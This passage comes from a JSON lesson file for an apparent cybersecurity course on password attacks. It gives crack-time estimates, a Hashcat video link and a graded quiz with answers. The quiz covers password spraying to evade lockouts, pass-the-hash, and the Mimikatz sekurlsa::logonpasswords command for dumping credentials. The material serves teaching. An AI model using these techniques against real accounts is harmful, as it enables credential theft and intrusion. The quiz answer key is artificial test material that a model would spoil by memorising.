cracks\n**Fix**: Calculate keyspace. If > 1 year, move on.\n\n**Mistake**: Not using rules with wordlists\n**Fix**: Always use best64.rule or similar (64x more effective)\n\n**Mistake**: Forgetting to show cracked hashes\n**Fix**: hashcat --show <file> or john --show <file>\n\n## Time/Cost Estimates\n\n**Cracking 8-Character Random Password**:\n\nNTLM (RTX 4090 GPU):\n- Keyspace: 94^8 = 6.1 quadrillion\n- Speed: 240 GH/s\n- Time: 6.1e15 / 240e9 / 3600 = 7 hours\n- Cost: $0 (own GPU)\n\nbcrypt (RTX 4090 GPU):\n- Keyspace: 94^8 = 6.1 quadrillion\n- Speed: 100 KH/s\n- Time: 6.1e15 / 100e3 / 3600 / 24 / 365 = 1,934 years\n- Cost: Impossible\n\n**Cloud GPU Rental** (AWS p4d.24xlarge - 8x A100):\n- Cost: $32.77/hour\n- NTLM speed: ~1.5 TH/s (1500 GH/s)\n- 8-char crack time: ~1 hour\n- Total cost: $33\n\nConclusion: NTLM is crackabl<br/>e, bcrypt is not (for random passwords)\n\nYou now have a comprehensive toolkit for password attacks and the knowledge to defend against them!"
      }
    },
    {
      "block_id": "d5e6f7a8-b9c0-4d01-9e0f-1a2b3c4d5e6f",
      "type": "video",
      "title": "Video: Password Cracking with Hashcat Tutorial",
      "content": {
        "url": "https://www.youtube.com/embed/z4_oqTZJqCo",
        "title": "Hashcat Tutorial - Password Cracking with GPU",
        "description": "Watch this comprehensive tutorial on using Hashcat for GPU-accelerated password cracking. Learn attack modes, optimization techniques, and real-world examples."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "q1",
      "type": "multiple_choice",
      "question": "What is the main advantage of offline password attacks (hash cracking) over online password attacks?",
      "options": [
        "They work without obtaining password hashes first",
        "They are much faster and don't trigger account lockouts or detection systems",
        "They always succeed within minutes",
        "They work against any authentication system"
      ],
      "correct_answer": 1,
      "explanation": "Offline attacks are much faster (millions of attempts per second with GPU) and don't risk detection or account lockout since you're cracking hashes locally. However, you must first obtain the password hashes through dumping SAM, NTDS.dit, or memory.",
      "difficulty": 2
    },
    {
      "question_id": "q2",
      "type": "multiple_choice",
      "question": "In Hashcat, what does the mask '?u?l?l?l?l?l?d?d' represent?",
      "options": [
        "8 random characters",
        "Uppercase letter + 5 lowercase letters + 2 digits (e.g., Password12)",
        "User input placeholder",
        "Unicode characters"
      ],
      "correct_answer": 1,
      "explanation": "Hashcat mask syntax: ?u=uppercase, ?l=lowercase, ?d=digit. The mask ?u?l?l?l?l?l?d?d matches patterns like Password12, Summer24, Winter99, etc. This is useful for cracking corporate passwords that follow Uppercase+word+digits patterns.",
      "difficulty": 2
    },
    {
      "question_id": "q3",
      "type": "multiple_choice",
      "question": "Why does Pass-the-Hash work on Windows systems?",
      "options": [
        "NTLM authentication only requires the password hash, not the plaintext password",
        "Windows stores passwords in plaintext",
        "It exploits a Windows vulnerability",
        "It only works on outdated Windows versions"
      ],
      "correct_answer": 0,
      "explanation": "Pass-the-Hash works because NTLM authentication protocol authenticates users with their password hash directly. You don't need to crack the password - just provide the hash. This is not a vulnerability but a design characteristic of NTLM. Mitigation includes disabling NTLM, using Kerberos, and implementing Credential Guard.",
      "difficulty": 2
    },
    {
      "question_id": "q4",
      "type": "multiple_choice",
      "question": "What is the recommended strategy for password spraying to avoid account lockouts?",
      "options": [
        "Try 100 passwords against one user",
        "Try one common password against many users",
        "Use slow timing between attempts",
        "Only attack at night"
      ],
      "correct_answer": 1,
      "explanation": "Password spraying tries ONE password against MANY users, rather than many passwords against one user. This avoids triggering account lockout policies (typically 3-5 failed attempts). Example: Try 'Password123!' against all 100 users, then 'Welcome2024!' against all users, etc.",
      "difficulty": 2
    },
    {
      "question_id": "q5",
      "type": "multiple_choice",
      "question": "Which Mimikatz command dumps plaintext passwords and NTLM hashes from memory?",
      "options": [
        "mimikatz::passwords",
        "sekurlsa::logonpasswords",
        "lsadump::sam",
        "token::elevate"
      ],
      "correct_answer": 1,
      "explanation": "sekurlsa::logonpasswords extracts credentials from LSASS (Local Security Authority Subsystem Service) memory, including plaintext passwords (if WDigest enabled), NTLM hashes, and Kerberos tickets. This requires SeDebugPrivilege (enabled with privilege::debug) and local admin or SYSTEM rights.",
      "difficulty": 1
    }
  ],
  "mastery_threshold": 80,
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "gamify_it",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "base_xp_reward": 250,
  "is_core_concept": true,
  "author": "CyberLearn Curriculum Team",
  "version": "3.0"
}